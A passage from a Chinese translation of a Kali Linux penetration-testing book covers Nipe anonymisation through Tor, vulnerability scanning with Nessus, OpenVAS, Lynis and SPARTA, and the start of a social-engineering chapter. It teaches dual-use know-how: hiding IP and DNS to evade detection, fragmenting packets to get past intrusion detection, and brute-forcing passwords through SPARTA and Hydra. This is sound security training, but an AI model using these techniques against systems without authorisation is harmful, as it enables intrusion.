![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f527c7bc-f3e1-492c-95e1-dc8e358f1afe.jpg)

请注意，Striker 还发现了 DNS 记录信息以及两个电子邮件地址，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3eda44f2-6431-47f2-95b2-749c267e8c36.jpg)

# 使用 Nipe 进行匿名

Nipe 是一种利用 Tor 网络作为用户默认网关的工具，从而通过 Tor 网络路由所有流量，通常用于提供一定程度的隐私和匿名性。需要注意的是，当使用隐私和匿名性工具时，仅掩盖 IP 地址将不会提供匿名性，因为 DNS 信息可能仍然可用。必须同时掩盖 IP 和 DNS 信息。

我们首先通过将 Nipe 克隆到我们的计算机的桌面或您选择的目录来安装 Nipe。打开终端并更改目录到桌面（或您选择的目录）：

```
Cd Desktop
```

通过输入以下内容将 Nipe 克隆到您的计算机：

```
git clone https://github.com/GouveaHeitor/nipe.git
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/523e0fd8-b899-464c-9039-6b762b5234ee.jpg)

通过输入`cd Nipe`更改到 Nipe 目录，然后通过输入`ls`列出目录内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c4a53e4e-c19c-4fe8-8e06-933ffb8c891a.jpg)

安装 Nipe，输入`cpan install Switch JSON LWP::UserAgent`。在提示进行自动安装时，按*Enter*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/77d30371-85ab-4ea6-9b5a-ca954dcab123.jpg)

安装 Nipe 依赖项，运行命令`perl nipe.pl install`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/861f0543-4641-44e5-bc9f-534b131266de.jpg)

在启动 Nipe 之前，检查您的公共 IP 地址和 DNS IP，并在启动 Nipe 后将它们与给定的 IP 进行比较。您可以使用的一些查看公共 IP 的网站示例是[www.whatsmyipaddress.com](http://www.whatsmyipaddress.com)和[www.dnsleak.com](http://www.dnsleak.com)。

要启动 Nipe 服务，请输入`perl nipe.pl start`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/febcafd0-2fb9-4b59-872f-34bd0941ec02.jpg)

您还可以通过输入`perl nipe.pl restart`重新启动服务，以将您的 IP 掩盖到不同的地区。安装和使用 Nipe 工具的所有命令也可以在其 GitHub 页面上找到[`github.com/GouveaHeitor/nipe`](https://github.com/GouveaHeitor/nipe)。

使用先前列出的 IP 和 DNS 验证网站来检查您的设置是否确实已更改。

# 总结

在本章中，我们讨论了目标发现过程。我们首先讨论了目标发现的目的：识别目标机器并找出目标机器使用的操作系统。然后，我们继续使用 Kali Linux 和 GitHub 提供的工具，这些工具可用于发现和识别目标机器。

我们讨论了用于主机发现和扫描的几种工具，如`ping`，Nmap，`p0f`和 Striker，并且还研究了使用 Nipe 来掩盖您的 IP 和 DNS 以逃避检测。

在下一章中，我们将讨论漏洞扫描以及在 Kali Linux 中用于此目的的工具。

# 问题

1.  哪个工具可以用于一次向多个主机发送 ICMP 回显请求？（`fping`）

1.  Nmap 7.7 中有多少个脚本？（588 个脚本）

1.  FIN 标志的目的是什么？（它表示没有更多数据要发送，并且连接应该被终止。）

1.  过滤端口表示什么？（阻止数据包的设备阻止了探测到达目标。）

1.  在规避防火墙和 IDS 时，可以使用哪个 Nmap 选项使数据包更难被检测到？（`-f`，用于分片数据包）

1.  使用 Netdiscover 工具扫描一系列 IP 的命令是什么？（netdiscover `-r`）

1.  在 Netdiscover 中可以使用哪个选项来运行被动扫描？（`-p`）

1.  哪个网站可以用来确保 DNS 信息没有泄漏？（[www.dnsleak.com](http://www.dnsleak.com/)）

# 进一步阅读

Linux 网络工具: [`gist.github.com/miglen/70765e663c48ae0544da08c07006791f`](https://gist.github.com/miglen/70765e663c48ae0544da08c07006791f)

Nmap 脚本引擎: [`nmap.org/book/nse.html`](https://nmap.org/book/nse.html)

端口扫描技术: [`nmap.org/book/man-port-scanning-techniques.html`](https://nmap.org/book/man-port-scanning-techniques.html)


# 第六章：漏洞扫描

漏洞映射是识别和分析目标环境中关键安全缺陷的过程。有时也被称为漏洞评估。这是漏洞管理计划的关键领域之一，通过它可以分析 IT 基础设施的安全控制与已知漏洞之间的关系。一旦信息收集、发现和枚举操作完成，就是时候调查目标基础设施中可能导致目标被攻破并侵犯商业系统的机密性、完整性和可用性的漏洞了。

在本章中，我们将讨论两种常见的漏洞类型，介绍各种用于分类漏洞的标准，并解释 Kali Linux 操作系统下提供的一些著名漏洞评估工具。本章探讨以下主题：

+   两种通用类型的漏洞概念：本地和远程。

+   漏洞分类法指向行业标准，可用于根据其统一的共性模式对任何漏洞进行分类。

+   一些安全工具可以帮助我们发现和分析目标环境中存在的安全漏洞。这些工具根据它们在安全评估过程中的基本功能进行分类。其中包括 Nessus、思科、模糊测试工具、SMB、SNMP 和 Web 应用程序分析工具。

请注意，在处理任何类型的渗透测试任务时，无论是内部还是外部，手动和自动漏洞评估程序应当受到同等对待。严格依赖自动化有时可能会产生误报和漏报。审计员对技术相关评估工具的了解程度可能是执行渗透测试时的决定性因素。测试人员使用的工具和技能应当不断更新以确保成功。此外，有必要提到自动漏洞评估并非最终解决方案；在某些情况下，自动化工具可能无法识别逻辑错误、未发现的漏洞、未公开的软件漏洞以及影响安全性的人为因素。

因此，建议使用综合方法，结合自动化和手动漏洞评估方法。这将提高成功渗透测试的可能性，并为纠正漏洞提供最佳信息。

# 技术要求

一台至少配备 6GB RAM、四核 CPU 和 500GB HDD 空间的笔记本电脑或台式机。对于操作系统，我们将使用 Kali Linux 2018.2 或 2018.3（作为虚拟机，或安装在 HDD、SD 卡或 USB 闪存驱动器上）。

# 漏洞类型

有三个主要的漏洞类别，可以根据这些类别对缺陷的类型进行区分，包括本地和远程漏洞。这些类别通常分为设计、实施和操作漏洞：

+   **设计漏洞**：这些是由于软件规范中发现的弱点而被发现的。

+   **实施漏洞**：这些是在系统代码中发现的技术安全漏洞。

+   **操作漏洞**：这些是由于系统在特定环境中的不正确配置和部署而可能出现的漏洞。

基于这三类，我们有两种通用类型的漏洞，即本地和远程漏洞，它们可以出现在任何类别的漏洞中。

# 本地漏洞

攻击者需要本地访问才能通过执行一段代码触发漏洞的情况被称为本地漏洞。通过利用这种类型的漏洞，攻击者可以提高其访问权限，获得对计算机的无限制访问。

让我们举一个例子，鲍勃可以访问运行 MS Windows Server 2008（32 位，x86 平台）的系统。 通过实施安全策略，管理员限制了他的访问权限，这将不允许他运行特定应用程序。 在极端情况下，他发现通过使用恶意代码，他可以获得系统级或内核级访问权限。 通过利用已知的漏洞（例如 CVE-2013-0232，GP Trap Handler nt!KiTrap0D），他获得了提升的特权，从而可以执行所有管理任务并无限制地访问应用程序。 这清楚地向我们展示了恶意对手如何利用漏洞来未经授权地访问系统。

有关 CVE-2013-0232 MS Windows 权限提升漏洞的更多信息，请访问[`www.exploit-db.com/exploits/11199/`](http://www.exploit-db.com/exploits/11199/)。

# 远程漏洞

远程漏洞是指攻击者没有先前访问权限，但仍然可以通过网络触发恶意代码来利用漏洞。 这种类型的漏洞允许攻击者远程访问计算机，而无需面对任何物理或本地障碍。

例如，鲍勃和爱丽丝分别连接到互联网。 他们两人有不同的 IP 地址，并且地理上分散在两个不同的地区。 假设爱丽丝的计算机正在运行 Windows XP 操作系统，并且保存着秘密的生物技术信息。 我们还假设鲍勃已经知道爱丽丝机器的操作系统和 IP 地址。 现在鲍勃正在寻找一个可以让他远程访问她的计算机的解决方案。 最终，他发现 MS08-067 Windows Server Service 的漏洞可以轻松地远程利用 Windows XP 机器。

然后，他触发了针对爱丽丝计算机的利用，并完全访问了它。

有关 MS08-067 MS Windows Server Service 漏洞的更多信息，请访问[`www.exploit-db.com/exploits/6841/`](http://www.exploit-db.com/exploits/6841/)。

# 漏洞分类

在过去几年中，随着可用技术数量的增加，人们已经尝试引入最佳分类法，以对所有常见的漏洞集进行分类。 但是，没有一个单一的分类法能够代表可能影响系统安全的所有常见编码错误。 这是因为单个漏洞可能属于多个类别。 此外，每个系统平台都有其与环境交互的连接性、复杂性和可扩展性基础。 因此，以下表中提出的分类标准将帮助您尽可能地识别大多数常见的安全漏洞。 请注意，这些分类法中的大多数已经在许多安全评估工具中实施，以实时调查软件安全问题：

| 安全分类资源链接 |
| --- |
| 七个有害王国[`www.cigital.com/papers/download/bsi11-taxonomy.pdf`](http://www.cigital.com/papers/download/bsi11-taxonomy.pdf) |
| 常见弱点枚举[`cwe.mitre.org/data/index.html`](http://cwe.mitre.org/data/index.html) |
| OWASP 十大漏洞[`www.owasp.org/index.php/Category:OWASP_Top_Ten_Project`](http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) |
| Klocwork[`www.klocwork.com/products/documentation/Insight-9.1/Taxonomy`](http://www.klocwork.com/products/documentation/Insight-9.1/Taxonomy) |
| WASC 威胁分类[`projects.webappsec.org/Threat-Classification`](http://projects.webappsec.org/Threat-Classification) |

每个这些分类法的主要功能是组织一组安全漏洞，这些漏洞可以被安全从业人员和开发人员用来识别可能对系统安全产生影响的特定错误。因此，没有一个分类法应被认为是完整和准确的。

# 自动漏洞扫描

纯粹的渗透测试人员经常评论使用自动漏洞扫描器是作弊，但在某些情况下，例如在有限的时间内进行渗透测试时，漏洞扫描器对于在短时间内获得有关目标网络的大量信息至关重要。

# 使用 Nessus 7 进行漏洞扫描

Tenable 的 Nessus 是一个非常受欢迎的漏洞评估工具，已经存在了将近 20 年。Nessus 可以通过年度订阅来访问；然而，Tenable 的工作人员已经将 Nessus 专业版作为 7 天试用版提供给那些希望尝试的人。

在安装 Nessus 之前，您可能希望注意您正在运行的 Kali Linux 版本，以确保您下载适当版本的 Nessus。

要做到这一点，只需在终端中输入`uname -a`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/87959570-cf53-44da-bb33-230d2f98bee6.png)

在这个截图中，我们可以看到我正在使用基于 Debian 的 64 位版本（amd64）的 Kali Linux。因此，我需要下载 Debian 构建的 64 位版本。

# 安装 Nessus 漏洞扫描器

要在 Kali Linux 中安装 Nessus，打开浏览器并导航到 Nessus 评估页面[`www.tenable.com/try`](https://www.tenable.com/try)。评估版本具有完整版本的所有功能，但扫描受到 16 个 IP 的限制。

您将需要在 Tenable 注册，以便评估代码可以发送到您的电子邮件。

收到带有评估代码的电子邮件后，您可以按照以下步骤在 Kali Linux 中下载适当版本的 Nessus，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4d12d21d-1c84-4b8e-8cd9-261499746044.png)

选择要安装的 Nessus 版本，点击接受以同意 Nessus 使用条款，然后在提示时点击保存文件选项保存 Nessus 下载。这将把文件保存到 Kali Linux 的 Downloads 文件夹中。在这个例子中，我选择了 64 位版本的 Nessus（`Nessus-7.1.3-debian6_amd64.deb`）。

下载完成后，打开一个新的终端，并通过输入`cd Downloads`来切换到 Downloads 目录。输入`ls`以查看 Downloads 目录的内容。这样做也很有用，因为我们可以复制 Nessus 下载文件的名称，并将其粘贴到以下命令中。然后，通过输入`dpkg -i Nessus-7.1.3-debian6_amd64.deb`来安装 Nessus，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a1a236f1-5538-4e7d-8e73-d4c32a2804e1.png)

如果有更新版本的 Nessus 可用，执行`dpkg -i`命令时复制您特定的下载文件和版本的名称。

在 Downloads 文件夹中，通过输入`service nessusd start`来启动 Nessus 服务。在提示时输入 Kali Linux 的密码，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/aa88c09f-15ba-48af-badf-cf5810947fb5.png)

使用 Nessus，打开浏览器，在地址栏中输入`https://localhost:8834` URL，然后按*Enter*。当显示不安全警告横幅时，点击高级按钮，然后点击添加异常，最后点击确认安全异常，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/1ccb4d49-4cf9-44b8-aad2-4abea278c9bc.png)

按照提示执行步骤 1-3，首先创建一个帐户，指定用户名和帐户，然后点击继续。

在第 2 步中，将默认的扫描器类型选项设置为家庭、专业或管理器，并将通过电子邮件收到的激活代码粘贴到激活代码字段中。点击继续继续。如果一切顺利，Nessus 将开始初始化，下载和编译所需的插件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/6225136e-f27c-415d-97dc-805811b2bcff.png)

这可能需要几分钟，具体取决于您的互联网连接速度。与此同时，随时可以浏览 Packt Publishing 在渗透测试和 Kali Linux 上的许多标题[www.packtpub.com](http://www.packtpub.com)。

完成所有更新后，Nessus 界面将加载。单击右上角的“新扫描”按钮，以查看所有可用的扫描类型，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0c72f543-31e0-4bcd-9920-4d9590f09739.png)

除了一些仅适用于付费订阅的模板外，还有各种扫描模板可供选择。除了执行主机发现和高级扫描外，Nessus 还可以执行许多类型的高级漏洞扫描，包括以下内容：

+   云基础设施扫描

+   本地和远程恶意 shell 检测扫描

+   内部 PCI 网络扫描

+   Linux 和 Windows 恶意软件扫描

+   Spectre 和 Meltdown 扫描

+   Wannacry 勒索软件扫描

+   Web 漏洞扫描

其中一些显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/73d7bbe9-94d9-4af9-a8f6-b3eb2b1468e7.png)

对于此评估，我将使用一个易受攻击的 Linux Web 服务器来演示漏洞披露的目的。如第二章中所述，*设置您的测试实验室*，您可以选择设置 Metasploitable 2、Metasploitable 3、Damn Vulnerable Linux，甚至 BadStore。

单击扫描窗口中的高级扫描模板，并填写基本部分中的字段。在目标字段中，指定要使用高级扫描模板扫描的主机或主机范围，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/994d1e37-16ee-45b9-a34d-59dd42908a69.png)

探索左侧栏的其他部分，因为有许多不同的设置。这些设置允许您自定义扫描以满足您的特定要求：

+   发现：Nessus 利用多种不同的方法来发现活动主机。在这里，您可以为主机发现设置特定参数。

+   评估：这允许您设置扫描的类型和深度。

+   报告：当准备渗透测试报告时，具有有关漏洞扫描的详细信息很重要。此功能允许您设置报告参数。

+   高级：高级设置允许您更改一次扫描的主机数量和其他时间参数。

配置完扫描后，可以选择保存或启动。现在，您将在“我的扫描”下看到您的扫描列表。

单击给定扫描名称右侧的播放图标。这将运行扫描。如果您在扫描运行时单击扫描名称，将会看到主机和一般的漏洞信息，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/175fc56d-726c-4274-b701-383febd8f80e.png)

单击主机将带您进入发现的漏洞的更详细列表。漏洞按以下方式进行颜色编码：

+   红色-关键

+   橙色-高

+   黄色-中

+   绿色-低

+   蓝色-信息性

如下截图所示，扫描结果显示发现了 70 个漏洞，其中 6 个是关键的，17 个是高级的，这意味着这台机器非常容易受攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/8bee9fc3-d629-4a2e-85df-91afc34c0bd7.png)

单击有颜色的漏洞类别，按照最易受攻击（即关键）到最不易受攻击（信息性）的顺序显示漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/45e21df9-caa0-4b0d-bb81-46ed80517ef0.png)

单击漏洞将为测试人员提供有关漏洞的更详细信息，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5d3837f8-4a08-4b14-80af-ca6d54fb23cd.png)

这些信息不仅包括有关漏洞的信息，还包括是否有可用的利用程序的信息。这使得渗透测试人员能够针对这些漏洞制定额外的攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3ecbc0d7-f578-4221-83fa-5ad4f3599232.png)

Nessus 是在任何渗透测试中使用的强大工具。它提供了大量信息和功能，本节无法涵盖。建议您花一些时间了解可用的功能以及如何使用它们。此外，Tenable 已经免费提供了家庭版本供您测试。如果您有外部 IP，或者正在为客户使用 Nessus，您将不得不使用付费版本。

# 使用 OpenVAS 进行漏洞扫描

**Open Vulnerability Assessment System**（**OpenVAS**）是一个开源漏洞扫描框架。OpenVAS 安装简单，具有用户友好的界面，用于执行漏洞评估。根据 OpenVAS 网站（[`www.openvas.org/about.html`](http://www.openvas.org/about.html)），框架中有超过 50,000 个**网络漏洞测试**（**NVTs**），这是 Greenbone Networks 商业漏洞管理框架的一部分。

要安装 OpenVAS，请打开新的终端并输入`apt-get install openvas`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/89942236-5f3f-46cb-ac99-2b7a1b9ebe35.jpg)

一旦 OpenVAS 安装成功，输入`openvas-setup`到终端开始设置和配置。这个过程可能需要一些时间，取决于你的下载速度：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c46cdddc-63bc-4cf9-bfc9-f07757d54d37.jpg)

在设置和配置过程结束时，OpenVAS 将生成一个密码密钥，启动 OpenVAS 时将需要该密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/49b48b7d-3ea5-43a2-9f41-bba548476d99.jpg)

要启动 OpenVAS 服务，请输入`openvas-start`，然后在浏览器窗口中输入`https://127.0.0.1:9392`或`https://localhost:9392`连接到 Web 界面。

再次使用 OpenVAS 时，只需打开终端并输入`openvas-start`，因此无需再次运行设置。

您还需要点击高级，然后添加异常，最后在输入先前的 URL 后确认安全异常，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2df559de-a9e0-4247-a86f-c94cefcc913c.jpg)

提示时，请使用用户名`admin`和在设置过程中生成的密码登录。请确保将此登录信息安全存储，因为您在使用 OpenVAS 时将需要登录，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/efa7b472-8fc3-489c-bbd6-73bd5660a301.jpg)

要运行扫描，请点击扫描，然后点击任务。一个信息框将打开，提示您将鼠标放在屏幕左上角的紫色图标上的任务向导上，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4d309c1d-e054-4d43-8cac-8329c5ad5181.jpg)

单击高级任务向导。在给定字段中输入相关信息。请注意，扫描配置字段有多种扫描类型可供选择，包括发现、完整和快速、完整和快速终极以及完整和非常深的终极（最耗时和资源消耗的选项）。开始时间选项允许渗透测试人员安排扫描。这可能非常有用，因为扫描可能会对网络造成干扰，因此您可能希望在工作时间之后或周末运行扫描，如果有必要的话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/280b4af1-5aa0-498a-abdf-3c4fdbff4ea1.jpg)

完成所有相关字段后，向下滚动并单击创建。这将启动扫描并显示扫描详细信息和状态摘要，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/aed4ce65-4537-43ec-b0fd-bb0ba2cde7a8.jpg)

要查看任务的更多详细信息，请单击名称字段内的任务名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/988f92d0-43c4-403d-a705-55384d3c9ec8.jpg)

扫描完成后，点击完成。这将生成一个报告，列出找到的漏洞以及每个漏洞的严重程度评级：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b76dbf59-51ae-45b5-8cae-8bb9ad2e17fd.jpg)

单击列出的每个漏洞会显示更多信息，包括摘要、影响、解决方案、受影响的软件/操作系统以及其他见解，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/217c2fd1-21e7-41f4-b0b5-153f4176e253.jpg)

# 使用 Lynis 进行 Linux 漏洞扫描

由 Cisofy（[www.cisofy.com](http://www.cisofy.com)）开发，Lynis 是 Kali Linux 中可用的命令行安全审计工具。Lynis 可免费使用，但也有企业版可用。Lynis 可用于对各个版本的 Linux、macOS X 和基于 Unix 的操作系统执行自动化安全审计评估和漏洞扫描。

Lynis 的特点在于它专注于执行各种 HIPAA、PCIDSS、SOX 和 GLBA 合规审计，在已采用各种合规标准的企业中具有很大的价值。Lynis 可以下载并安装在独立系统上，从而消除了远程审计和漏洞评估工具产生的大部分流量，尽管也可以选择执行远程评估。

Lynis 是 Kali Linux 套件的一部分，但也可以从 GitHub（[`github.com/CISOfy/lynis`](https://github.com/CISOfy/lynis)）克隆或直接从官方网站（[`cisofy.com/documentation/lynis/get-started/#installation`](https://cisofy.com/documentation/lynis/get-started/#installation)）下载。

要在 Kali 中运行 Lynis，可以通过单击“应用程序”，然后单击“漏洞分析”，然后单击“Lynis”，或者在终端中键入`lynis`来执行。此命令显示了 Lynis 的安装版本（在本例中为 2.6.2）并初始化程序。还显示了一些有用的命令选项，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/32b1daa4-4e7b-4c26-af01-cdef0c835606.png)

您还可以随时键入**`lynis show commands`**来查看 Lynis 中可用的命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9ff880ee-5c7e-46b0-a9a4-cfd9cebbcfac.png)

由于 Lynis 是一个完全自动化的审计评估工具，因此使用的命令很少。要对整个 Kali Linux 机器进行审计，只需键入`lynis audit system`。此评估的时间取决于运行评估的 Kali Linux 机器的规格，但通常为 15 至 30 分钟。审计显示如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/868dc2e4-59a5-42d4-92de-611d332ab931.jpg)

对系统执行的一些测试和审计包括以下内容：

+   Debian 测试

+   引导和服务

+   内核

+   内存和进程

+   用户、组和身份验证

+   外壳

+   文件系统

+   USB 设备

+   网络和防火墙

+   端口和打印机

+   内核加固

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5bdfc838-a44e-4877-a4a8-595836b3085f.jpg)

以下屏幕截图显示了 Lynis 审计结果的片段，其中有 4 个警告和 40 个建议：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9cdd1abf-63cf-4c0b-9b26-19181ab34a82.png)

滚动到审计评估的末尾，我们可以找到 Lynis 审计的摘要详情如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d84ee4f1-1d92-4389-9ff2-93b6e3adf2c1.jpg)

# 使用 SPARTA 进行漏洞扫描和枚举

SPARTA 是一个 GUI 网络基础设施渗透测试工具，由 SECFORCE 的 Antonio Quina 和 Leonidas Stavliotis 编写，并内置在 Kali Linux 中。SPARTA 自动化了扫描、枚举和漏洞评估过程。除了其扫描和枚举功能外，SPARTA 还具有用于破解密码的内置暴力破解工具。

最新版本的 SPARTA 也可以从 GitHub 下载，并使用`git clone https://github.com/secforce/sparta.git`命令克隆到本地机器。

要在 Kali Linux 2018 中启动 SPARTA，请单击“应用程序”，然后单击“漏洞分析”，然后选择 SPARTA。

在 SPARTA 1.0.3 GUI 中，单击左窗格以将主机或主机添加到范围。也可以通过单击“文件”，然后单击“将主机添加到范围”来完成此操作，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/1337574f-32c9-4c01-a31c-009d8b110d94.jpg)

添加主机后，针对目标运行 Nmap 主机发现和分阶段 Nmap 扫描，因为在上一个屏幕截图中选择了这些选项。以下屏幕截图显示了正在进行的扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9039c6da-db3a-42db-b06a-0c498fc22a2a.png)

完成 Nmap 扫描后，SPARTA 在主窗口中提供了几个选项卡，如 Services、Scripts、Information、Notes、Nikto 和 Screenshot 选项卡，都提供非常有用的信息。

默认情况下，我们首先在 Services 选项卡下看到了一个开放端口和服务列表，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ed07fd38-861a-49cd-a96a-3832ec4cac9b.jpg)

点击 Information 选项卡会显示收集的主机信息，包括 IP 信息；开放、关闭和过滤的端口数量（如果有）；以及操作系统和版本的准确度评级：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/1c6dfb6b-32a6-4dcc-bfba-455a1d217adb.png)

在这种情况下，目标是一个 Linux Web 服务器，Nikto Web 扫描工具也作为流程的一部分运行。点击 nikto（80/tcp）选项卡会显示发现的漏洞列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ccf05705-04a8-42fb-ad2f-6ce50fd9dab3.png)

发现的许多漏洞都带有 OSVBD 前缀，这表明它们可以在**通用漏洞和暴露**（**CVE**）和**开放源漏洞数据库**（**OSVDB**）等数据库中搜索。例如，渗透测试人员可以通过简单的 Google 搜索 OSVDB-3268，找到 SPARTA 在先前扫描中发现的存在漏洞的更多信息。然后他们可以利用各种工具，如 Metasploit，来利用这一点，这将在本书的后续章节中讨论。

查看扫描中包含的另一台 Windows 机器（**10.10.22.217**），点击 Services 选项卡会显示几个开放端口，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/170687a0-e2fc-4379-b1d2-989862585584.jpg)

由于检测到了 Windows 机器，SPARTA 运行了`smbenum`工具来枚举 Windows 机器，以检查空会话并执行枚举任务，包括搜索用户和共享，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c74d4806-6cd6-4f94-b374-7a65b4856d2d.png)

SPARTA 通过允许渗透测试人员执行各种网络渗透测试功能，将扫描、枚举和漏洞评估推进了一步。在 Services 选项卡中，我们可以右键单击任何开放端口来执行这些任务。

在下面的截图中，右键单击开放端口 3306 会呈现尝试使用 Telnet、Netcat 或 MySQL 客户端（作为 root）打开端口的选项。还有一个选项是发送到 Brute，尝试通过暴力破解来破解密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/cafa5a47-1764-4c64-9eb1-89decac2edda.png)

点击 Send to Brute 会尝试通过所选端口使用 THC Hydra 密码破解工具进行暴力攻击。还可以在尝试中使用用户名和密码列表，以及各种选项尝试空密码、尝试登录作为密码等。在指定选项后，点击 Run 尝试进行攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/55fc817f-5279-4366-8990-c852bd05df2d.jpg)

这些绝不是 Sparta 中唯一可用的工具。例如，在 Windows 机器上右键单击开放端口 445 会显示渗透测试人员可用的更多选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9b5608f3-603f-4b8a-a29b-feb99a315197.png)

# 总结

在本章中，我们讨论了基于 Kali Linux 中使用的一些工具的过程，以识别和分析关键的安全漏洞。我们还提到了三种主要类别的漏洞——设计、实施和操作，并讨论了它们如何分为两种通用类型的漏洞：本地和远程。之后，我们讨论了几种漏洞分类法，安全审计员可以按照它们的统一共性模式对安全漏洞进行分类。为了进行漏洞评估，我们向您介绍了一些允许进行自动化扫描和漏洞评估的工具，包括 Nessus、OpenVAS、Lynis 和 SPARTA。

在下一章中，我们将讨论欺骗的艺术，并解释利用人类的各种弱点以获取目标的各种方法。虽然这个过程有时是可选的，但在缺乏信息可用以允许我们利用目标基础设施时，它被认为是至关重要的。

# 问题

1.  漏洞和利用之间有什么关系？

1.  哪类漏洞被认为是最难解决的？

1.  哪个网站可以用来获取最新漏洞的信息？

1.  远程漏洞的定义是什么？

1.  哪个工具可以执行内部和外部 PCI DSS 扫描？

1.  哪个工具是专门用于审核 Linux 系统的？

1.  哪个工具集成到 Sparta 中用于进行网站扫描？

# 进一步阅读

+   利用和漏洞信息：[`www.exploit-db.com/`](https://www.exploit-db.com/)

+   常见漏洞和暴露数据库：[`cve.mitre.org/`](https://cve.mitre.org/)

+   Rapid7 漏洞和利用数据库：[`www.rapid7.com/db`](https://www.rapid7.com/db)

+   Nessus 扫描教程：[`docs.tenable.com/nessus/Content/Scans.htm`](https://docs.tenable.com/nessus/Content/Scans.htm)

+   OpenVAS 社区论坛：[`community.greenbone.net/`](https://community.greenbone.net/)


# 第七章：社会工程

社会工程是通过利用人类的弱点来学习和获取有价值信息的实践。这是一种被认为在缺乏可以利用的目标信息时对渗透测试人员至关重要的欺骗艺术。由于人是任何组织安全防御中最薄弱的一环，社会工程是安全基础设施中最脆弱的层。我们是社会性动物，因此我们的天性使我们容易受到社会工程攻击的影响。社会工程师利用这些攻击来获取机密信息或进入受限区域。社会工程采用不同形式的攻击向量；每种攻击受个人想象力的限制，基于其执行的影响和方向。本章将讨论专业社会工程师采用的核心原则和实践，以操纵人类透露信息或执行行为。

在本章中，我们将涵盖以下主题：

+   制定社会工程师目标和愿景的基本心理原则

+   社会工程的一般攻击过程和方法，以及实际例子

